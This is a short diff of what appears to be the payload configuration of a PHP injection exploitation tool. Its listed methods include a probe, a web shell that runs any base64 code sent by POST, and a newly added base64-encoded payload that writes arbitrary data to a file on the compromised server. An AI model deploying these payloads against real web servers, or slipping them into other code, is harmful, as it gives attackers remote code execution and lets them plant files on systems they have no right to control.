@@ -49,6 +49,7 @@
 		<quiz 				isbase64="1" 	source="cm5kID0gc2VsZi5nZXRSYW5kb21TdHIoKQpwaHBjb2RlID0gImVjaG8gIgpmb3IgYyBpbiBybmQ6CiAgICBwaHBjb2RlICs9ICJjaHIoJWQpLiIlKG9yZChjKSkKcGhwY29kZSA9ICI8P3BocCAlczsgPz4iICUocGhwY29kZVs6LTFdKQpyZXQgPSAocGhwY29kZSwgcm5kKQo=" />
 		<print 				isbase64="0" 	source="&lt;?php echo '__PLACEHOLDER__'; ?&gt;" />
 		<eval_kickstarter 	isbase64="0" 	source="&lt;?php eval(base64_decode($_POST['data'])); ?&gt;" />
+		<write_file         isbase64="1"    source="PD9waHAgJG15RmlsZSA9ICJfX0ZJTEVfXyI7CiRmaCA9IGZvcGVuKCRteUZpbGUsICdfX01PREVfXycpIG9yIGRpZSgiRkFJTEVEIik7CiRkID0gYmFzZTY0X2RlY29kZSgiX19CNjRfREFUQV9fIik7CmZ3cml0ZSgkZmgsICRkKTsKZmNsb3NlKCRmaCk7ID8+" />
 	</methods>
 	
 	<detectors>
